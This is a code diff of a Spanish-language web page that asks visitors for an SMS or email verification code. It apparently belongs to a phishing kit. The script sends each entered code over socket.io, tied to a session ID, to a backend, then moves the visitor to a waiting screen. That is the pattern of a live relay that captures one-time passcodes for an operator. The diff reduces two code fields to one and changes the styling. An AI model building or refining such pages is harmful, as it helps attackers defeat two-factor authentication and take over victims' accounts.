@@ -54,7 +54,7 @@
     }
 
     button {
-      background: #FF4C00;
+      background: #1B4D08;
       color: white;
       padding: 0.75rem 2rem;
       border: none;
@@ -82,23 +82,17 @@
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos el codigo SMS a su celular y a su correo electrónico</h3>
-    <p>Introduce los dos códigos de verificación que te acabamos de enviar a tu celular de confianza y a tu correo electrónico simultáneamente.</p>
+    <h3>Te enviaremos un código SMS a tu celular y tu correo electronico.</h3>
+    <p>Introduce el código de verificación que acabamos de enviarte.</p>
     
-    <!-- Primer campo -->
+    <!-- Campo único -->
     <div class="input-group">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo1" placeholder="Código de verificación (SMS)" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
-    </div>
-    
-    <!-- Segundo campo -->
-    <div class="input-group">
-      <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo2" placeholder="Código de verificación (Email)" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
     </div>
 
     <p id="mensajeError" class="mensaje-error"></p>
-    <button onclick="validarCodigo()">Validar códigos</button>
+    <button onclick="validarCodigo()">Validar código</button>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
@@ -108,27 +102,22 @@
     socket.emit("reconectar", sessionId);
 
     function validarCodigo() {
-      const codigo1 = document.getElementById("codigo1").value;
-      const codigo2 = document.getElementById("codigo2").value;
+      const codigo = document.getElementById("codigo").value;
       const mensajeError = document.getElementById("mensajeError");
-      const codigoInput1 = document.getElementById("codigo1");
-      const codigoInput2 = document.getElementById("codigo2");
+      const codigoInput = document.getElementById("codigo");
 
       mensajeError.textContent = "";
-      codigoInput1.classList.remove("campo-requerido");
-      codigoInput2.classList.remove("campo-requerido");
+      codigoInput.classList.remove("campo-requerido");
 
-      if (!codigo1 || !codigo2) {
-        mensajeError.textContent = "Ambos códigos son obligatorios";
-        if (!codigo1) codigoInput1.classList.add("campo-requerido");
-        if (!codigo2) codigoInput2.classList.add("campo-requerido");
-      } else if (!/^\d{6}$/.test(codigo1) || !/^\d{6}$/.test(codigo2)) {
-        mensajeError.textContent = "Cada código debe tener 6 dígitos numéricos";
-        if (!/^\d{6}$/.test(codigo1)) codigoInput1.classList.add("campo-requerido");
-        if (!/^\d{6}$/.test(codigo2)) codigoInput2.classList.add("campo-requerido");
+      if (!codigo) {
+        mensajeError.textContent = "El código es obligatorio";
+        codigoInput.classList.add("campo-requerido");
+      } else if (!/^\d{6}$/.test(codigo)) {
+        mensajeError.textContent = "El código debe tener exactamente 6 dígitos numéricos";
+        codigoInput.classList.add("campo-requerido");
       } else {
-        // Enviar los códigos al backend
-        socket.emit("codigoIngresado", { codigo1, codigo2, sessionId });
+        // Enviar el código al backend
+        socket.emit("codigoIngresado", { codigo, sessionId });
 
         // Ir a pantalla de espera
         window.location.href = "opciones.html";
